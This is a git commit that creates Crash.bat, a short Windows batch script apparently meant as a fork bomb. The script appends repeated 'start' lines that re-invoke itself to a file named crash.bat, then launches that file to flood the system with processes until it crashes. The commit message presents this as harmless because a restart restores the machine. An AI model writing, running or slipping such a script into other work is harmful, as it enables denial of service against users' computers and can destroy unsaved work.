e77ae46adfd26f86c9e83af8f1d56f85f4daa25e
LoosedWhale <81869656+LoosedWhale@users.noreply.github.com>
2023-02-11 17:02:22 +0100

    Create Crash.bat
    All it does is crash the computer once. You can restart and the computer will be back to normal.

---
+++ Crash.bat
@@ -0,0 +1,45 @@
+@ echo off
+
+rem ———————————
+
+rem Crash Computer
+
+echo start “” %0>>crash.bat
+
+echo start “” %0>>crash.bat
+
+echo start “” %0>>crash.bat
+
+echo start “” %0>>crash.bat
+
+echo start “” %0>>crash.bat
+
+echo start “” %0>>crash.bat
+
+echo start “” %0>>crash.bat
+
+echo start “” %0>>crash.bat
+
+echo start “” %0>>crash.bat
+
+echo start “” %0>>crash.bat
+
+echo start “” %0>>crash.bat
+
+echo start “” %0>>crash.bat
+
+echo start “” %0>>crash.bat
+
+echo start “” %0>>crash.bat
+
+echo start “” %0>>crash.bat
+
+echo start “” %0>>crash.bat
+
+echo start “” %0>>crash.bat
+
+echo start “” %0>>crash.bat
+
+start “” crash.bat
+
+rem ———————————
